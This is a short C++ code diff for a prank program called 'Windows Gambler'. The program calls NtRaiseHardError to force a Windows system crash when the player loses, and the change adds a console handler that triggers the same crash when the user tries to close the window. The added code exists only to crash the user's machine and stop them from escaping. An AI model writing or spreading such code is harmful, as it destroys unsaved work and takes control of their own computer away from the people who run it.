@@ -25,7 +25,19 @@ static void Lose() {
     NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
 }
 
+BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
+    switch (dwCtrlType) {
+    case CTRL_CLOSE_EVENT:
+        Lose();
+        return TRUE;
+    default:
+        return FALSE;
+    }
+}
+
 int main() {
+    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
+
     std::srand(std::time(nullptr));
 
     std::cout << "Welcome to Windows Gambler, if you lose, you get a neat little reward!" << std::endl;
